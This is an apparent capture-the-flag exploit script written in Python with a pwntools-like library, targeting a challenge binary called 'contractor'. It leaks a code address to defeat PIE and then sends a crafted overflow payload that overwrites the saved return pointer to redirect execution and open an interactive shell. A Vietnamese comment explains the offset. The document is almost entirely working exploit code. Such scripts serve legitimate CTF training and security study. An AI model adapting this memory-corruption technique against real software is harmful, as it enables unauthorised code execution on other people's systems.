#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from time import sleep

context.log_level = 'debug'
exe = context.binary = ELF('./contractor', checksec=False)
libc = exe.libc

def init(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        docker_port = sys.argv[1]
        docker_path = sys.argv[2]
        p = remote("localhost", docker_port)
        sleep(1)
        pid = process(["pgrep", "-fx", docker_path]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        pause()
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''

# brva 0x153C
# brva 0x15BB
# brva 0x1639
# brva 0x167A
# brva 0x1735
brva 0x175E
brva 0x1AA4

c
c
'''.format(**locals())

p = init()

# ==================== EXPLOIT ====================

def exploit():

    sl(b'A' * 15)
    sl(b'B' * 255)
    sl(b'4')
    s(b'C' * 16)

    ru(b'CCCCCCCCCCCCCCCC')
    __libc_csu_init = u64(rl()[:-1].ljust(0x8, b'\0'))
    exe.address = __libc_csu_init - exe.sym["__libc_csu_init"]
    slog("__libc_csu_init", __libc_csu_init)
    slog("pie base", exe.address)

    sl(b'4')
    sleep(0.4)

    payload = flat(
    { 
        28: p32(1)  
    }, 
        b'\x1f' + p64(exe.sym.contract)  # Lúc này buf ở speciality đã fill là 0x20 rồi (tức là đã chạm tến buf pointer) nên ta cần phải cho *alloca + 0x118 + 0x20 nữa để chạm đến saved RIP
    )
    sla(b'at: ', payload)
    ru(b' lad!\n\n')


    interactive(flag=True)

if __name__ == '__main__':
    exploit()
